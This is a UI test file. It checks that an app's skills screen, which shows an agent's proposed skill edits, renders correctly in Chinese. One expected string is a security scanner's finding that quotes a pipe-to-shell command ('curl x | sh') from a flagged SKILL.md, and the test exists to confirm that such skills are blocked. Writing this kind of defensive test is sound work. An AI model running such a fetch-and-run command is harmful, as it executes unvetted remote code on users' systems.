// @vitest-environment jsdom
import { cleanup, screen } from "@testing-library/react";
import { afterEach, describe, expect, it } from "vitest";
import { fakeClient } from "../testing/fake-client";
import { renderSignedIn, settle } from "../testing/render-signed-in";
import { skillsAnswers } from "../testing/skills-fixture";
import { SkillsScreen } from "./skills-screen";

afterEach(cleanup);

describe("the skills screen in Chinese", () => {
  it("names the proposals, their findings and the waiting skill in Chinese", async () => {
    renderSignedIn(<SkillsScreen />, { client: fakeClient(skillsAnswers).client, locale: "zh" });
    await settle();
    expect(screen.getByRole("heading", { level: 1, name: "技能" })).toBeDefined();
    expect(screen.getByText("修改")).toBeDefined();
    expect(screen.getByText("原因：You asked me to buy smaller dips.")).toBeDefined();
    expect(screen.getByText("新技能")).toBeDefined();
    expect(screen.getByText("扫描发现了问题，无法应用。请拒绝它，或让 Agent 修改：")).toBeDefined();
    expect(screen.getByText("SKILL.md，第 6 行：pipe_to_shell：curl x | sh")).toBeDefined();
    expect(screen.getAllByRole("button", { name: "应用" })).toHaveLength(1);
    expect(screen.getAllByRole("button", { name: "拒绝" })).toHaveLength(2);
    expect(screen.getByRole("button", { name: "接受" })).toBeDefined();
    expect(
      screen.getByText(
        "新增或已更改，因此不会加载。请先检查 workspace/planted/SKILL.md 中的文件。",
      ),
    ).toBeDefined();
  });
});
